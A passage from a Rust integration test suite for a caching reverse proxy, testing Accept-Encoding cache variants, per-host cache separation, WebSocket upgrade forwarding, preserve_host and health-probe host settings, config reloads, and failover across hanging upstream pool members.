    let profiles: [&[(&str, &str)]; 4] =
        [&[CHROME], &[SAFARI], &[], &[("accept-encoding", "gzip")]];
    let results = join_all((0..40).map(|i| {
        let st = st.clone();
        let h = profiles[i % 4];
        async move { fetch(&st, "/ae/herd", h).await.0 }
    }))
    .await;
    assert_eq!(
        hits(&o),
        1,
        "40 cold requests, 4 encodings, 1 origin fetch: {results:?}"
    );
}

#[tokio::test]
async fn an_encoded_body_is_never_served_to_a_client_that_did_not_accept_it() {
    let (o, st) = rig("").await;
    o.gzip_if_accepted.store(true, Ordering::Relaxed);
    let (c, ce, _) = fetch_ce(&st, "/ae/gz", &[CHROME]).await;
    assert_eq!((c.as_str(), ce.as_str()), ("MISS", "gzip"));
    settle().await;
    // an identity-only client must get its own identity response, not the gzip entry
    let (c, ce, body) = fetch_ce(&st, "/ae/gz", &[]).await;
    assert_eq!(ce, "", "identity client got Content-Encoding {ce:?} ({c})");
    assert!(
        body.ends_with("|-"),
        "made for a client without Accept-Encoding: {body}"
    );
    settle().await;
    // and each keeps getting its own
    assert_eq!(fetch_ce(&st, "/ae/gz", &[CHROME]).await.1, "gzip");
    assert_eq!(fetch_ce(&st, "/ae/gz", &[]).await.1, "");
    assert_eq!(hits(&o), 2);
}

#[tokio::test]
async fn a_client_that_refuses_identity_is_not_served_the_identity_entry() {
    let (o, st) = rig("").await;
    fetch(&st, "/ae/noid", &[]).await; // an identity entry
    settle().await;
    let before = hits(&o);
    let (c, _) = fetch(
        &st,
        "/ae/noid",
        &[("accept-encoding", "gzip, identity;q=0")],
    )
    .await;
    assert_eq!(
        c, "MISS",
        "identity;q=0 must not be served an identity body from the cache"
    );
    assert_eq!(hits(&o), before + 1);
}

#[tokio::test]
async fn the_shared_identity_entry_is_invalidated_and_ranged_like_any_other() {
    let (o, st) = rig("").await;
    fetch(&st, "/ae/inv", &[]).await;
    settle().await;
    // a Range from a client with a different Accept-Encoding is served from the same entry
    let (code, h, body) = raw(&st, "/ae/inv", &[SAFARI, ("range", "bytes=0-1")]).await;
    assert_eq!(
        (code, h.get("x-zion-cache").unwrap().to_str().unwrap()),
        (206, "HIT")
    );
    assert_eq!(body.len(), 2);
    // an unsafe request on the path invalidates it for everyone
    assert!(send(&st, Method::POST, "/ae/inv").await < 400);
    settle().await;
    let before = hits(&o);
    assert_eq!(fetch(&st, "/ae/inv", &[CHROME]).await.0, "MISS");
    assert_eq!(hits(&o), before + 1);
}

#[tokio::test]
async fn an_origin_that_varies_on_accept_encoding_keeps_one_entry_per_encoding() {
    // nginx `gzip on; gzip_vary on;`: identity to a client without gzip, gzip otherwise,
    // `Vary: Accept-Encoding` on both. A client without gzip coming first must not make
    // every browser get the uncompressed body.
    let (o, st) = rig("Accept-Encoding").await;
    o.gzip_if_accepted.store(true, Ordering::Relaxed);
    let (c, ce, _) = fetch_ce(&st, "/ae/vary", &[]).await;
    assert_eq!((c.as_str(), ce.as_str()), ("MISS", ""));
    settle().await;
    let (c, ce, _) = fetch_ce(&st, "/ae/vary", &[CHROME]).await;
    assert_eq!(
        (c.as_str(), ce.as_str()),
        ("MISS", "gzip"),
        "a browser gets the origin's gzip, not the shared identity entry"
    );
    settle().await;
    assert_eq!(fetch_ce(&st, "/ae/vary", &[CHROME]).await.1, "gzip");
    assert_eq!(fetch_ce(&st, "/ae/vary", &[]).await.1, "");
    assert_eq!(hits(&o), 2);
}

#[tokio::test]
async fn concurrent_cold_requests_to_an_encoding_origin_each_get_their_own() {
    let (o, st) = rig("").await;
    o.gzip_if_accepted.store(true, Ordering::Relaxed);
    o.delay_ms.store(200, Ordering::Relaxed);
    let profiles: [&[(&str, &str)]; 4] =
        [&[CHROME], &[SAFARI], &[], &[("accept-encoding", "gzip")]];
    let results = join_all((0..40).map(|i| {
        let st = st.clone();
        let h = profiles[i % 4];
        async move { (i % 4, fetch_ce(&st, "/ae/gzherd", h).await) }
    }))
    .await;
    for (p, (c, ce, _)) in &results {
        let want = if *p == 2 { "" } else { "gzip" };
        assert_eq!(ce, want, "profile {p} ({c}) got {ce:?}");
    }
    assert!(
        hits(&o) <= 4,
        "at most one fetch per encoding set: {}",
        hits(&o)
    );
}

#[tokio::test]
async fn a_background_refresh_never_turns_the_shared_identity_entry_into_gzip() {
    let (o, st) = rig_cc("", "public, max-age=1, stale-while-revalidate=30").await;
    fetch(&st, "/ae/swr", &[]).await; // the shared identity entry
    settle().await;
    o.gzip_if_accepted.store(true, Ordering::Relaxed); // the origin starts compressing
    tokio::time::sleep(Duration::from_millis(1300)).await;
    // a browser finds the stale identity entry; its refresh comes back gzip
    let (c, ce, _) = fetch_ce(&st, "/ae/swr", &[CHROME]).await;
    assert_eq!((c.as_str(), ce.as_str()), ("STALE-WHILE-REVALIDATE", ""));
    settle().await;
    let (_, ce, _) = fetch_ce(&st, "/ae/swr", &[]).await;
    assert_eq!(
        ce, "",
        "a client without gzip must never get the gzip refresh"
    );
}

// ── the response cache is per host ──────────────────────────────────────────

/// An origin answering `<name>:<X-Forwarded-Host>` to everything; returns its port and
/// its hit counter.
async fn named_origin(name: &'static str) -> (u16, Arc<std::sync::atomic::AtomicUsize>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let hits = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let h = hits.clone();
    tokio::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            let h = h.clone();
            tokio::spawn(async move {
                let svc = hyper::service::service_fn(move |req: Request<hyper::body::Incoming>| {
                    h.fetch_add(1, Ordering::Relaxed);
                    let xfh = req
                        .headers()
                        .get("x-forwarded-host")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("-")
                        .to_string();
                    async move {
                        Ok::<_, std::convert::Infallible>(
                            hyper::Response::builder()
                                .header("cache-control", "public, max-age=60")
                                .body(Full::new(Bytes::from(format!("{name}:{xfh}"))))
                                .unwrap(),
                        )
                    }
                });
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(TokioIo::new(stream), svc)
                    .await;
            });
        }
    });
    (port, hits)
}

fn hosts_state(routes: &str, upstreams: &str) -> Arc<AppState> {
    let toml = format!(
        r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"
[tls]
cert_path = "/c"
key_path = "/k"
[upstreams]
{upstreams}
[cache_profile.c]
ttl_seconds = 3600
max_entries = 100
{routes}
"#
    );
    AppState::for_tests(&toml::from_str::<ZionConfig>(&toml).expect("config parses"))
}

#[tokio::test]
async fn two_hosts_routed_to_two_origins_never_share_an_entry() {
    let (pa, ha) = named_origin("A").await;
    let (pb, hb) = named_origin("B").await;
    let st = hosts_state(
        r#"
[[route]]
path = "/{*rest}"
hosts = ["a.test"]
upstream = "a"
mode = "static_cache"
cache_profile = "c"
[[route]]
path = "/{*rest}"
hosts = ["b.test"]
upstream = "b"
mode = "static_cache"
cache_profile = "c"
"#,
        &format!("a = \"http://127.0.0.1:{pa}\"\nb = \"http://127.0.0.1:{pb}\""),
    );
    let (c, body) = fetch(&st, "/page", &[("host", "a.test")]).await;
    assert_eq!((c.as_str(), body.as_str()), ("MISS", "A:a.test"));
    settle().await;
    let (c, body) = fetch(&st, "/page", &[("host", "b.test")]).await;
    assert_eq!(
        (c.as_str(), body.as_str()),
        ("MISS", "B:b.test"),
        "b.test must get its own origin's body, never a.test's cached one"
    );
    settle().await;
    assert_eq!(
        fetch(&st, "/page", &[("host", "a.test")]).await.1,
        "A:a.test"
    );
    assert_eq!(
        fetch(&st, "/page", &[("host", "b.test")]).await.1,
        "B:b.test"
    );
    assert_eq!(
        (ha.load(Ordering::Relaxed), hb.load(Ordering::Relaxed)),
        (1, 1)
    );
}

#[tokio::test]
async fn one_route_serving_several_hosts_keeps_one_entry_per_host() {
    // A route without `hosts`, to an origin that answers per X-Forwarded-Host (a
    // multi-tenant app behind one upstream).
    let (p, hits) = named_origin("O").await;
    let st = hosts_state(
        r#"
[[route]]
path = "/{*rest}"
upstream = "o"
mode = "static_cache"
cache_profile = "c"
"#,
        &format!("o = \"http://127.0.0.1:{p}\""),
    );
    assert_eq!(
        fetch(&st, "/t", &[("host", "one.test")]).await.1,
        "O:one.test"
    );
    settle().await;
    assert_eq!(
        fetch(&st, "/t", &[("host", "two.test")]).await.1,
        "O:two.test"
    );
    settle().await;
    assert_eq!(hits.load(Ordering::Relaxed), 2);
    // the same host in another spelling (case, port, trailing dot, HTTP/2 authority)
    // is the same entry
    for (uri, h) in [
        ("/t", &[("host", "ONE.test:443")][..]),
        ("/t", &[("host", "one.test.")][..]),
        ("https://one.test/t", &[][..]),
    ] {
        let (c, body) = fetch(&st, uri, h).await;
        assert_eq!(
            (c.as_str(), body.as_str()),
            ("HIT", "O:one.test"),
            "{uri} {h:?}"
        );
    }
    assert_eq!(hits.load(Ordering::Relaxed), 2);
    // and an unsafe request on one host still invalidates the path
    assert!(send_host(&st, Method::POST, "/t", "one.test").await < 400);
    settle().await;
    assert_eq!(fetch(&st, "/t", &[("host", "one.test")]).await.0, "MISS");
}

async fn send_host(st: &Arc<AppState>, method: Method, uri: &str, host: &str) -> u16 {
    let req = Request::builder()
        .method(method)
        .uri(uri)
        .header("host", host)
        .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
        .unwrap();
    process_request(
        req,
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap()
    .status()
    .as_u16()
}

// ── a WebSocket upgrade is a valid HTTP/1.1 request to the upstream ─────────

/// A raw upstream that records the head of each request it gets and accepts the upgrade.
async fn recording_ws_origin() -> (u16, Arc<Mutex<Vec<String>>>) {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let s = seen.clone();
    tokio::spawn(async move {
        while let Ok((mut c, _)) = listener.accept().await {
            let s = s.clone();
            tokio::spawn(async move {
                let mut buf = Vec::new();
                let mut chunk = [0u8; 4096];
                while !buf.windows(4).any(|w| w == b"\r\n\r\n") {
                    match c.read(&mut chunk).await {
                        Ok(0) | Err(_) => return,
                        Ok(n) => buf.extend_from_slice(&chunk[..n]),
                    }
                }
                s.lock()
                    .unwrap()
                    .push(String::from_utf8_lossy(&buf).into_owned());
                let _ = c
                    .write_all(
                        b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\
                          Connection: Upgrade\r\n\
                          Sec-WebSocket-Accept: ICX+Yqv66kxgM0FcWaLWlFLwTAI=\r\n\r\n",
                    )
                    .await;
                tokio::time::sleep(Duration::from_millis(200)).await;
            });
        }
    });
    (port, seen)
}

#[tokio::test]
async fn a_websocket_upgrade_reaches_the_upstream_with_host_and_an_origin_form_target() {
    let (port, seen) = recording_ws_origin().await;
    let st = hosts_state(
        "[[route]]\npath = \"/{*rest}\"\nupstream = \"w\"\n",
        &format!("w = \"http://127.0.0.1:{port}\""),
    );
    let mut req = ws_request("/chat/room?x=1");
    req.headers_mut()
        .insert("host", hyper::header::HeaderValue::from_static("app.test"));
    let resp = process_request(
        req,
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(resp.status().as_u16(), 101);
    let head = seen
        .lock()
        .unwrap()
        .first()
        .cloned()
        .expect("upstream got the upgrade");
    let mut lines = head.split("\r\n");
    assert_eq!(
        lines.next().unwrap(),
        "GET /chat/room?x=1 HTTP/1.1",
        "origin-form target, not absolute-form: {head}"
    );
    let hosts: Vec<&str> = lines
        .filter_map(|l| {
            l.split_once(':')
                .filter(|(k, _)| k.eq_ignore_ascii_case("host"))
                .map(|(_, v)| v.trim())
        })
        .collect();
    let upstream = format!("127.0.0.1:{port}");
    assert_eq!(
        hosts,
        [upstream.as_str()],
        "exactly one Host, the upstream's (RFC 9112 §3.2): {head}"
    );
    assert!(
        head.to_ascii_lowercase()
            .contains("x-forwarded-host: app.test"),
        "the client's host is still passed on: {head}"
    );
    // A client may send the target in absolute form (RFC 9112 §3.2.2), with the host in
    // the URI: the upstream still gets origin-form and its own Host, and the client's
    // host in X-Forwarded-Host.
    let resp = process_request(
        ws_request("http://app.test/chat/abs"),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(resp.status().as_u16(), 101);
    let head = seen
        .lock()
        .unwrap()
        .get(1)
        .cloned()
        .expect("second upgrade");
    assert!(
        head.starts_with("GET /chat/abs HTTP/1.1\r\n"),
        "origin-form: {head}"
    );
    let lower = head.to_ascii_lowercase();
    assert!(
        lower.contains(&format!("\r\nhost: 127.0.0.1:{port}\r\n")),
        "{head}"
    );
    assert!(lower.contains("x-forwarded-host: app.test"), "{head}");
}

// ── [upstream.x] preserve_host (ADR-0024) ───────────────────────────────────

/// An origin answering `host=<Host>` with `cache_control`; counts its requests.
async fn host_echo_origin(
    cache_control: &'static str,
) -> (u16, Arc<std::sync::atomic::AtomicUsize>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let hits = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let h = hits.clone();
    tokio::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            let h = h.clone();
            tokio::spawn(async move {
                let svc = hyper::service::service_fn(move |req: Request<hyper::body::Incoming>| {
                    h.fetch_add(1, Ordering::Relaxed);
                    let hosts: Vec<String> = req
                        .headers()
                        .get_all("host")
                        .iter()
                        .map(|v| v.to_str().unwrap_or("?").to_string())
                        .collect();
                    async move {
                        Ok::<_, std::convert::Infallible>(
                            hyper::Response::builder()
                                .header("cache-control", cache_control)
                                .body(Full::new(Bytes::from(format!("host={}", hosts.join(",")))))
                                .unwrap(),
                        )
                    }
                });
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(TokioIo::new(stream), svc)
                    .await;
            });
        }
    });
    (port, hits)
}

/// A state with one route (`mode`) to upstream `u` = `urls`, with `preserve_host` as given.
fn preserve_state(mode: &str, urls: &str, preserve: bool, profile: &str) -> Arc<AppState> {
    // (a route with a cache profile is served by the cache handler whatever its mode)
    let cache = if mode == "static_cache" {
        "cache_profile = \"c\""
    } else {
        ""
    };
    let toml = format!(
        r#"
[server]
listen_http = "127.0.0.1:0"
listen_https = "127.0.0.1:0"
[tls]
cert_path = "/c"
key_path = "/k"
[upstream.u]
urls = [{urls}]
preserve_host = {preserve}
[cache_profile.c]
ttl_seconds = 3600
max_entries = 100
{profile}
[[route]]
path = "/{{*rest}}"
upstream = "u"
mode = "{mode}"
{cache}
"#
    );
    AppState::for_tests(&toml::from_str::<ZionConfig>(&toml).expect("config parses"))
}

async fn body_for(st: &Arc<AppState>, uri: &str, headers: &[(&str, &str)]) -> (u16, String) {
    let resp = process_request(
        get(uri, headers),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    let status = resp.status().as_u16();
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    (status, String::from_utf8_lossy(&body).into_owned())
}

#[tokio::test]
async fn preserve_host_sends_the_clients_host_in_every_mode() {
    let (port, _) = host_echo_origin("no-store").await;
    let url = format!("\"http://127.0.0.1:{port}\"");
    let upstream = format!("host=127.0.0.1:{port}");
    for mode in ["standard", "sse_stream", "static_cache"] {
        let on = preserve_state(mode, &url, true, "");
        let off = preserve_state(mode, &url, false, "");
        let h = [("host", "App.Example:8443")];
        assert_eq!(
            body_for(&on, "/p", &h).await,
            (200, "host=App.Example:8443".to_string()),
            "{mode}: the client's Host, exactly once, as received"
        );
        assert_eq!(
            body_for(&off, "/p", &h).await,
            (200, upstream.clone()),
            "{mode}: without it, the upstream's own authority (unchanged)"
        );
        // an HTTP/2 client has no Host header, only the :authority (here the URI's)
        assert_eq!(
            body_for(&on, "https://h2.example/p", &[]).await.1,
            "host=h2.example",
            "{mode}: an HTTP/2 client's :authority"
        );
    }
}

#[tokio::test]
async fn preserve_host_survives_a_pool_failover() {
    let (port, _) = host_echo_origin("no-store").await;
    // the first member refuses connections, so the request is retried on the second
    let dead = {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        l.local_addr().unwrap().port()
    };
    let urls = format!("\"http://127.0.0.1:{dead}\", \"http://127.0.0.1:{port}\"");
    let st = preserve_state("standard", &urls, true, "");
    for _ in 0..4 {
        assert_eq!(
            body_for(&st, "/p", &[("host", "app.example")]).await,
            (200, "host=app.example".to_string())
        );
    }
}

#[tokio::test]
async fn a_background_refresh_sends_the_clients_host_too() {
    let (port, hits) = host_echo_origin("public, max-age=1, stale-while-revalidate=30").await;
    let st = preserve_state(
        "static_cache",
        &format!("\"http://127.0.0.1:{port}\""),
        true,
        "",
    );
    let h = [("host", "app.example")];
    assert_eq!(body_for(&st, "/r", &h).await.1, "host=app.example");
    settle().await;
    tokio::time::sleep(Duration::from_millis(1300)).await;
    // served stale; the refresh runs in the background
    assert_eq!(body_for(&st, "/r", &h).await.1, "host=app.example");
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while hits.load(Ordering::Relaxed) < 2 {
        assert!(std::time::Instant::now() < deadline, "no refresh");
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    settle().await;
    // what the refresh stored is what the origin answered to the client's Host
    let (_, body) = body_for(&st, "/r", &h).await;
    assert_eq!(body, "host=app.example", "the refreshed entry");
    assert_eq!(hits.load(Ordering::Relaxed), 2);
}

#[tokio::test]
async fn preserve_host_applies_to_websocket_upgrades() {
    let (port, seen) = recording_ws_origin().await;
    let st = preserve_state(
        "standard",
        &format!("\"http://127.0.0.1:{port}\""),
        true,
        "",
    );
    let mut req = ws_request("/chat");
    req.headers_mut().insert(
        "host",
        hyper::header::HeaderValue::from_static("app.example"),
    );
    let resp = process_request(
        req,
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
        false,
    )
    .await
    .unwrap();
    assert_eq!(resp.status().as_u16(), 101);
    let head = seen
        .lock()
        .unwrap()
        .first()
        .cloned()
        .unwrap()
        .to_ascii_lowercase();
    assert!(head.starts_with("get /chat http/1.1\r\n"), "{head}");
    assert_eq!(head.matches("\r\nhost:").count(), 1, "{head}");
    assert!(head.contains("\r\nhost: app.example\r\n"), "{head}");
}

#[test]
fn preserve_host_picks_an_http1_only_client_of_its_own() {
    let st = preserve_state("standard", "\"http://127.0.0.1:1\"", true, "");
    let h1 = crate::proxy::ClientSpec {
        http1_only: true,
        ..crate::proxy::ClientSpec::DEFAULT
    };
    let _ = st.client_for(h1.clone());
    let _ = st.client_for(crate::proxy::ClientSpec::DEFAULT);
    assert!(st.http_clients.contains_key(&h1));
    assert!(
        !st.http_clients
            .contains_key(&crate::proxy::ClientSpec::DEFAULT),
        "the default client is the shared one"
    );
}

#[tokio::test]
async fn the_port_80_acme_fallback_honours_preserve_host() {
    let (port, _) = host_echo_origin("no-store").await;
    let st = preserve_state(
        "standard",
        &format!("\"http://127.0.0.1:{port}\""),
        true,
        "",
    );
    let resp = crate::handle_http(
        get(
            "/.well-known/acme-challenge/tok",
            &[("host", "app.example")],
        ),
        st.clone(),
        "203.0.113.9:1".parse::<SocketAddr>().unwrap(),
    )
    .await
    .unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    assert_eq!(&body[..], b"host=app.example");
}

/// The protocols a client offers in its TLS ClientHello (read before any certificate is
/// involved, so no trusted certificate is needed: the handshake is abandoned there).
async fn alpn_offered_by(client: crate::proxy::HttpClient) -> Vec<String> {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let server = tokio::spawn(async move {
        let (stream, _) = listener.accept().await.unwrap();
        let acceptor =
            tokio_rustls::LazyConfigAcceptor::new(rustls::server::Acceptor::default(), stream);
        let start = acceptor.await.unwrap();
        start
            .client_hello()
            .alpn()
            .map(|it| {
                it.map(|p| String::from_utf8_lossy(p).into_owned())
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default()
    });
    let req = Request::builder()
        .uri(format!("https://localhost:{port}/"))
        .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
        .unwrap();
    let _ = tokio::time::timeout(Duration::from_secs(2), client.request(req)).await;
    server.await.unwrap()
}

#[tokio::test]
async fn an_http1_only_client_does_not_offer_http2() {
    let _ = rustls::crypto::aws_lc_rs::default_provider().install_default();
    let ms = crate::proxy::DEFAULT_CONNECT_TIMEOUT_MS;
    // (no ALPN at all is HTTP/1.1: a server can only pick h2 when it is offered)
    let offered = alpn_offered_by(crate::proxy::build_http_client(ms, true)).await;
    assert!(
        !offered.iter().any(|p| p == "h2"),
        "preserve_host upstreams must never negotiate HTTP/2: {offered:?}"
    );
    assert_eq!(
        alpn_offered_by(crate::proxy::build_http_client(ms, false)).await,
        ["h2", "http/1.1"],
        "the default client still offers HTTP/2"
    );
}

/// An origin that, like Django's `ALLOWED_HOSTS`, answers 400 to any Host but `allowed`.
async fn host_checking_origin(allowed: &'static str) -> u16 {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            tokio::spawn(async move {
                let svc = hyper::service::service_fn(move |req: Request<hyper::body::Incoming>| {
                    let ok =
                        req.headers().get("host").and_then(|v| v.to_str().ok()) == Some(allowed);
                    async move {
                        Ok::<_, std::convert::Infallible>(
                            hyper::Response::builder()
                                .status(if ok { 200 } else { 400 })
                                .body(Full::new(Bytes::new()))
                                .unwrap(),
                        )
                    }
                });
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(TokioIo::new(stream), svc)
                    .await;
            });
        }
    });
    port
}

#[tokio::test]
async fn the_health_probe_sends_health_host_when_set() {
    let port = host_checking_origin("app.example").await;
    let url = format!("http://127.0.0.1:{port}/");
    let ms = crate::proxy::DEFAULT_CONNECT_TIMEOUT_MS;
    let (c, h1) = (
        crate::proxy::build_http_client(ms, false),
        crate::proxy::build_http_client(ms, true),
    );
    let up = crate::health::UpstreamHealth::new_healthy();
    assert!(
        !crate::health::probe(&c, &h1, &url, &up).await.0,
        "the endpoint's own address as Host: the backend refuses it"
    );
    up.probe_host
        .store(Some(Arc::new(hyper::header::HeaderValue::from_static(
            "app.example",
        ))));
    assert!(
        crate::health::probe(&c, &h1, &url, &up).await.0,
        "health_host is accepted"
    );
}

#[tokio::test]
async fn a_probe_with_health_host_never_offers_http2() {
    let _ = rustls::crypto::aws_lc_rs::default_provider().install_default();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let server = tokio::spawn(async move {
        let (stream, _) = listener.accept().await.unwrap();
        let start =
            tokio_rustls::LazyConfigAcceptor::new(rustls::server::Acceptor::default(), stream)
                .await
                .unwrap();
        start
            .client_hello()
            .alpn()
            .map(|it| {
                it.map(|p| String::from_utf8_lossy(p).into_owned())
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default()
    });
    let ms = crate::proxy::DEFAULT_CONNECT_TIMEOUT_MS;
    let up = crate::health::UpstreamHealth::new_healthy();
    up.probe_host
        .store(Some(Arc::new(hyper::header::HeaderValue::from_static(
            "app.example",
        ))));
    let _ = crate::health::probe(
        &crate::proxy::build_http_client(ms, false),
        &crate::proxy::build_http_client(ms, true),
        &format!("https://localhost:{port}/"),
        &up,
    )
    .await;
    let offered = server.await.unwrap();
    assert!(!offered.iter().any(|p| p == "h2"), "{offered:?}");
}

#[test]
fn health_host_is_applied_and_follows_a_reload() {
    let cfg = |extra: &str| {
        let toml = format!(
            "[server]\nlisten_http=\"127.0.0.1:0\"\nlisten_https=\"127.0.0.1:0\"\n\
             [tls]\ncert_path=\"/c\"\nkey_path=\"/k\"\n\
             [upstream.u]\nurl=\"http://127.0.0.1:9\"\npreserve_host = true\n{extra}\n\
             [[route]]\npath=\"/{{*r}}\"\nupstream=\"u\"\n"
        );
        toml::from_str::<ZionConfig>(&toml).unwrap()
    };
    let host_of = |snap: &crate::state::ResolvedAppConfig| {
        snap.health_map["http://127.0.0.1:9"]
            .probe_host
            .load_full()
            .map(|h| h.to_str().unwrap().to_string())
    };
    let first =
        crate::state::ResolvedAppConfig::try_build(&cfg("health_host = \"a.example\""), 1000)
            .unwrap();
    assert_eq!(host_of(&first).as_deref(), Some("a.example"));
    let changed =
        crate::reload::rebuild(&cfg("health_host = \"b.example\""), &first, 1000).unwrap();
    assert_eq!(
        host_of(&changed).as_deref(),
        Some("b.example"),
        "a reload changes it"
    );
    let removed = crate::reload::rebuild(&cfg(""), &changed, 1000).unwrap();
    assert_eq!(host_of(&removed), None, "and can remove it");
}

// ── the health checker follows reloads ──────────────────────────────────────

#[tokio::test]
async fn the_health_checker_probes_upstreams_added_by_a_reload() {
    let (live, _) = named_origin("L").await;
    let dead = {
        let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        l.local_addr().unwrap().port()
    }; // nothing listens: every probe fails
    let cfg = |upstreams: &str| {
        format!(
            "[server]\nlisten_http=\"127.0.0.1:0\"\nlisten_https=\"127.0.0.1:0\"\n\
             [tls]\ncert_path=\"/c\"\nkey_path=\"/k\"\n[upstreams]\n{upstreams}\n\
             [[route]]\npath=\"/a/{{*r}}\"\nupstream=\"a\"\n"
        )
    };
    let boot = cfg(&format!("a = \"http://127.0.0.1:{live}\""));
    let st = AppState::for_tests(&toml::from_str::<ZionConfig>(&boot).unwrap());
    let ms = crate::proxy::DEFAULT_CONNECT_TIMEOUT_MS;
    let prober = tokio::spawn(crate::health::run_prober(
        st.clone(),
        crate::proxy::build_http_client(ms, false),
        crate::proxy::build_http_client(ms, true),
    ));
    // let it finish a round on the boot config first (the live upstream gets a latency)
    let live_url = format!("http://127.0.0.1:{live}");
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while st.config.load().health_map[live_url.as_str()]
        .latency_us
        .load(Ordering::Relaxed)
        == 0
    {
        assert!(
            std::time::Instant::now() < deadline,
            "boot upstream never probed"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    // reload: route /a now goes to an upstream that is down
    let reloaded: ZionConfig =
        toml::from_str(&cfg(&format!("a = \"http://127.0.0.1:{dead}\""))).unwrap();
    let next = crate::reload::rebuild(&reloaded, &st.config.load(), 1000).expect("reload builds");
    st.config.store(Arc::new(next));
    let url = format!("http://127.0.0.1:{dead}");
    let deadline = std::time::Instant::now() + Duration::from_secs(10);
    loop {
        let down = !st.config.load().health_map[url.as_str()]
            .healthy
            .load(Ordering::Relaxed);
        if down {
            break;
        }
        assert!(
            std::time::Instant::now() < deadline,
            "an upstream added by a reload was never probed"
        );
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    prober.abort();
}

// ── a pool member that never answers is bounded and failed over ─────────────

/// Accepts connections and never answers; counts them.
async fn hanging_origin() -> (u16, Arc<std::sync::atomic::AtomicUsize>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let accepted = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let a = accepted.clone();
    tokio::spawn(async move {
        let mut held = Vec::new();
        while let Ok((s, _)) = listener.accept().await {
            a.fetch_add(1, Ordering::Relaxed);
            held.push(s); // keep it open, say nothing
        }
    });
    (port, accepted)
}

fn pool_state(ports: &[u16]) -> Arc<AppState> {
    let urls = ports
        .iter()
        .map(|p| format!("\"http://127.0.0.1:{p}\""))
        .collect::<Vec<_>>()
        .join(", ");
    hosts_state(
        "[[route]]\npath = \"/{*rest}\"\nupstream = \"p\"\n",
        &format!("[upstream.p]\nurls = [{urls}]"),
    )
}

async fn timed(st: &Arc<AppState>, method: Method, uri: &str) -> (u16, Duration) {
    let t = std::time::Instant::now();
    let req = Request::builder()
        .method(method)
        .uri(uri)
        .body(Full::new(Bytes::new()).map_err(|n| match n {}).boxed())
        .unwrap();
    let resp = tokio::time::timeout(
        Duration::from_secs(15),
        process_request(req, st.clone(), "203.0.113.9:1".parse().unwrap(), false),
    )
    .await
    .expect("the request must not hang")
    .unwrap();
    (resp.status().as_u16(), t.elapsed())
}

#[tokio::test]
async fn a_pool_member_that_never_answers_is_failed_over() {
    let (hang, accepted) = hanging_origin().await;
    let (good, _) = named_origin("G").await;
    let st = pool_state(&[hang, good]);
    // Which member a request tries first is a random pick, so "8 requests" did not guarantee
    // that the hanging one was tried at all (seen in CI and locally, about one run in 25):
    // keep going until it has been, and require every answer on the way to be a 200.
    let mut sent = 0;
    while accepted.load(Ordering::Relaxed) == 0 {
        assert!(
            sent < 64,
            "the hanging member was never tried in {sent} requests (else this proves nothing)"
        );
        let (code, took) = timed(&st, Method::GET, &format!("/r{sent}")).await;
        assert_eq!(code, 200, "request {sent} took {took:?}");
        sent += 1;
    }
}

#[tokio::test]
async fn a_pool_that_never_answers_gets_504_and_a_post_is_not_replayed() {
    let (h1, a1) = hanging_origin().await;
    let (h2, a2) = hanging_origin().await;
    let st = pool_state(&[h1, h2]);
    let (code, _) = timed(&st, Method::GET, "/g").await;
    assert_eq!(code, 504, "every member timed out");
    let tries = |a: &std::sync::atomic::AtomicUsize| a.load(Ordering::Relaxed);
    assert_eq!(
        (tries(&a1), tries(&a2)),
        (1, 1),
        "a GET tries each member once"
    );
    let (code, _) = timed(&st, Method::POST, "/p").await;
    assert_eq!(code, 504);
    assert_eq!(
        tries(&a1) + tries(&a2),
        3,
        "a POST that may have been processed is not sent again"
    );
}

// ── `[upstream.x] request_timeout_ms` (#517) ────────────────────────────────

